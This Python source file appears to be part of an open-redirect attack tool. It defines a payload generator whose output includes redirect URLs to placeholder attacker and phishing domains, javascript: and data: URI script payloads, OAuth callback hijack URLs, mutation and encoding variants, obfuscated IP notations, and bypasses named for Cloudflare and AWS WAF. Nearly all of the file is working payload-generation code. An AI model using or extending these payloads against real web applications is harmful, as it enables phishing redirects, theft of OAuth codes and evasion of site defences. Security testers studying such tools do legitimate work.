#!/usr/bin/env python3
"""
🔥 ADVANCED PAYLOAD GENERATOR - Dynamic Payload Creation
"""

import random
import urllib.parse
from typing import List, Dict
from payloads import CompletePayloads


class AdvancedPayloadGenerator:
    """Advanced dynamic payload generation"""
    
    def __init__(self):
        self.base_payloads = CompletePayloads()
        
        # Dynamic generation templates
        self.payload_templates = {
            'protocol_relative': [
                "//{}",
                "/\\{}",
                "\\\\{}"
            ],
            'protocol_absolute': [
                "http://{}",
                "https://{}",
                "ftp://{}",
                "file://{}"
            ],
            'javascript_protocol': [
                "javascript:confirm('{}')",
                "javascript:alert('{}')",
                "javascript:prompt('{}')",
                "javascript:window.open('{}')"
            ],
            'data_protocol': [
                "data:text/html,<script>location.href='{}'</script>",
                "data:text/html,<meta http-equiv=refresh content='0;url={}'>"
            ],
            'unicode_domains': [
                "//{}",
                "//www.{}",
                "//subdomain.{}"
            ],
            'ip_variations': [
                "//{}",
                "http://{}",
                "https://{}"
            ]
        }
        
        # Target domains for generation
        self.target_domains = [
            'evil.com', 'attacker.com', 'malicious.com', 'phishing.com',
            'fake-bank.com', 'fake-paypal.com', 'fake-google.com',
            'fake-metamask.io', 'phishing-opensea.io', 'malicious-uniswap.org'
        ]
        
        # IP addresses
        self.target_ips = [
            '216.58.214.206',  # Google IP
            '127.0.0.1',       # Localhost
            '192.168.1.1',     # Private
            '10.0.0.1'         # Private
        ]
        
        # Encoding variations
        self.encoding_methods = [
            'url_encode', 'double_url_encode', 'unicode_encode',
            'hex_encode', 'mixed_case', 'dot_notation'
        ]
    
    def generate_context_payloads(self, context: str, param_name: str = "") -> List[str]:
        """Generate context-specific payloads"""
        payloads = []
        
        if context == 'web3':
            payloads.extend(self.generate_web3_payloads())
        elif context == 'javascript':
            payloads.extend(self.generate_javascript_payloads())
        elif context == 'fragment':
            payloads.extend(self.generate_fragment_payloads())
        elif context == 'oauth':
            payloads.extend(self.generate_oauth_payloads())
        elif context == 'admin':
            payloads.extend(self.generate_admin_payloads())
        
        # Add parameter-specific payloads
        if param_name:
            payloads.extend(self.generate_parameter_specific_payloads(param_name))
        
        # Add base payloads
        payloads.extend(self.base_payloads.get_all_original_payloads()[:20])
        
        return list(set(payloads))[:25]  # Limit and deduplicate
    
    def generate_web3_payloads(self) -> List[str]:
        """Generate Web3-specific payloads"""
        web3_domains = [
            'fake-metamask.io', 'phishing-wallet.com', 'malicious-dapp.eth',
            'fake-uniswap.org', 'phishing-compound.finance', 'evil-aave.com',
            'fake-opensea.io', 'phishing-rarible.com', 'malicious-foundation.app'
        ]
        
        payloads = []
        
        for domain in web3_domains:
            payloads.extend([
                f"//{domain}",
                f"https://{domain}",
                f"web3://{domain}",
                f"ethereum://{domain}",
                f"ipfs://{domain}"
            ])
        
        # Web3-specific protocols
        payloads.extend([
            "ethereum://0x1234567890123456789012345678901234567890",
            "web3://malicious-contract.eth",
            "ipfs://QmMaliciousHashForRedirect123456789",
            "ens://hacker.eth",
            "metamask://connect?redirect=//evil.com"
        ])
        
        return payloads
    
    def generate_javascript_payloads(self) -> List[str]:
        """Generate JavaScript-specific payloads"""
        js_payloads = [
            "javascript:confirm(document.domain)",
            "javascript:alert('Open Redirect PoC')",
            "javascript:prompt('Redirected to: '+location.href)",
            "javascript:window.open('//evil.com')",
            "javascript:location.href='//attacker.com'",
            "javascript:document.location='//malicious.com'",
            "javascript:top.location='//phishing.com'",
            "javascript:parent.location='//evil.com'",
            "javascript:self.location='//attacker.com'",
            "javascript:window.location.assign('//evil.com')",
            "javascript:window.location.replace('//attacker.com')",
            "javascript:history.pushState(null,null,'//evil.com')"
        ]
        
        return js_payloads
    
    def generate_fragment_payloads(self) -> List[str]:
        """Generate fragment-specific payloads"""
        fragment_payloads = [
            "#//evil.com",
            "#redirect=//attacker.com",
            "#url=//malicious.com",
            "#next=//phishing.com",
            "#callback=//evil.com",
            "#success_url=//attacker.com",
            "#return_url=//malicious.com",
            "#javascript:confirm(1)",
            "#data:text/html,<script>alert(1)</script>"
        ]
        
        return fragment_payloads
    
    def generate_oauth_payloads(self) -> List[str]:
        """Generate OAuth-specific payloads"""
        oauth_payloads = [
            "//evil.com/oauth/callback",
            "//attacker.com/login/success",
            "//malicious.com/auth/redirect",
            "//phishing.com/callback?code=stolen",
            "https://evil.com/oauth/authorize",
            "https://attacker.com/sso/callback"
        ]
        
        return oauth_payloads
    
    def generate_admin_payloads(self) -> List[str]:
        """Generate admin panel payloads"""
        admin_payloads = [
            "//evil.com/admin/backdoor",
            "//attacker.com/control/panel",
            "//malicious.com/admin/users",
            "javascript:confirm('Admin Panel Compromised')",
            "//evil.com/dashboard/hijacked"
        ]
        
        return admin_payloads
    
    def generate_parameter_specific_payloads(self, param_name: str) -> List[str]:
        """Generate parameter name-specific payloads"""
        payloads = []
        param_lower = param_name.lower()
        
        # Callback parameters
        if 'callback' in param_lower:
            payloads.extend([
                "//evil.com/callback/hijacked",
                "javascript:confirm('Callback Hijacked')",
                "https://attacker.com/steal/callback"
            ])
        
        # Success URL parameters
        elif 'success' in param_lower:
            payloads.extend([
                "//evil.com/fake/success",
                "//attacker.com/phishing/success",
                "javascript:alert('Success Page Hijacked')"
            ])
        
        # Next/Continue parameters
        elif any(keyword in param_lower for keyword in ['next', 'continue', 'forward']):
            payloads.extend([
                "//evil.com",
                "//attacker.com/next/step",
                "//malicious.com/continue/process"
            ])
        
        # Return URL parameters
        elif 'return' in param_lower:
            payloads.extend([
                "//evil.com/return/hijacked",
                "//attacker.com/fake/return",
                "javascript:confirm('Return URL Hijacked')"
            ])
        
        return payloads
    
    def generate_encoded_variants(self, payload: str) -> List[str]:
        """Generate encoded variants of payload"""
        variants = []
        
        # URL encoding variations
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(payload, safe=''))
        variants.append(urllib.parse.quote_plus(payload))
        
        # Double encoding
        encoded_once = urllib.parse.quote(payload)
        variants.append(urllib.parse.quote(encoded_once))
        
        # Mixed case
        variants.append(payload.upper())
        variants.append(payload.lower())
        variants.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        
        # Character substitutions
        substitutions = {
            '/': ['%2f', '%2F', '\\', '%5c', '%5C'],
            ':': ['%3a', '%3A'],
            '.': ['%2e', '%2E', '。'],  # Unicode full-width period
            '=': ['%3d', '%3D']
        }
        
        for char, replacements in substitutions.items():
            if char in payload:
                for replacement in replacements:
                    variants.append(payload.replace(char, replacement))
        
        return list(set(variants))  # Deduplicate
    
    def generate_ip_based_payloads(self) -> List[str]:
        """Generate IP-based payloads"""
        ip_payloads = []
        
        for ip in self.target_ips:
            # Different IP formats
            ip_parts = ip.split('.')
            
            # Decimal notation
            decimal_ip = sum(int(part) * (256 ** (3 - i)) for i, part in enumerate(ip_parts))
            ip_payloads.append(f"http://{decimal_ip}")
            
            # Octal notation
            octal_parts = [f"{int(part):03o}" for part in ip_parts]
            octal_ip = '.'.join(octal_parts)
            ip_payloads.append(f"http://{octal_ip}")
            
            # Hex notation
            hex_parts = [f"0x{int(part):02x}" for part in ip_parts]
            hex_ip = '.'.join(hex_parts)
            ip_payloads.append(f"http://{hex_ip}")
            
            # Mixed notation
            mixed_ip = f"{ip_parts[0]}.{int(ip_parts[1]):03o}.{int(ip_parts[2])}.0x{int(ip_parts[3]):02x}"
            ip_payloads.append(f"http://{mixed_ip}")
        
        return ip_payloads
    
    def generate_bypass_payloads(self, waf_type: str) -> List[str]:
        """Generate WAF-specific bypass payloads"""
        base_domains = ['evil.com', 'attacker.com']
        bypass_payloads = []
        
        for domain in base_domains:
            if waf_type == 'cloudflare':
                # CloudFlare-specific bypasses
                bypass_payloads.extend([
                    f"//{domain}",
                    f"//www.{domain}",
                    f"https://{domain}",
                    f"/{domain}",
                    f"\\{domain}",
                    f"/%2f{domain}",
                    f"//%5c{domain}"
                ])
            
            elif waf_type == 'aws_waf':
                # AWS WAF bypasses
                bypass_payloads.extend([
                    f"//{domain}%00",
                    f"//{domain}%20",
                    f"//{domain}%09",
                    f"//{domain}%0a",
                    f"https://{domain}%2f%2e%2e"
                ])
            
            else:
                # Generic bypasses
                bypass_payloads.extend([
                    f"//{domain}",
                    f"https://{domain}",
                    f"/{domain}",
                    f"javascript:location.href='//{domain}'"
                ])
        
        return bypass_payloads
    
    def generate_mutation_payloads(self, original_payload: str) -> List[str]:
        """Generate mutated versions of successful payload"""
        mutations = []
        
        # Character insertion
        for i in range(len(original_payload)):
            # Insert null bytes
            mutations.append(original_payload[:i] + '%00' + original_payload[i:])
            # Insert spaces
            mutations.append(original_payload[:i] + '%20' + original_payload[i:])
            # Insert tabs
            mutations.append(original_payload[:i] + '%09' + original_payload[i:])
        
        # Character substitution
        substitutions = [
            ('/', '%2f'), ('/', '\\'), (':', '%3a'),
            ('.', '%2e'), ('=', '%3d'), ('?', '%3f'),
            ('#', '%23'), ('&', '%26')
        ]
        
        for old_char, new_char in substitutions:
            if old_char in original_payload:
                mutations.append(original_payload.replace(old_char, new_char))
        
        # Protocol mutations
        if original_payload.startswith('//'):
            domain = original_payload[2:]
            mutations.extend([
                f"http://{domain}",
                f"https://{domain}",
                f"ftp://{domain}",
                f"javascript:location.href='//{domain}'"
            ])
        
        return mutations[:10]  # Limit mutations
    
    def get_payload_statistics(self) -> Dict[str, int]:
        """Get payload statistics"""
        original_count = len(self.base_payloads.get_all_original_payloads())
        web3_count = len(self.base_payloads.get_web3_payloads())
        
        return {
            'original_payloads': original_count,
            'web3_payloads': web3_count,
            'total_base_payloads': original_count + web3_count,
            'template_categories': len(self.payload_templates),
            'target_domains': len(self.target_domains),
            'ip_variations': len(self.target_ips) * 4,  # 4 formats per IP
            'encoding_methods': len(self.encoding_methods)
        }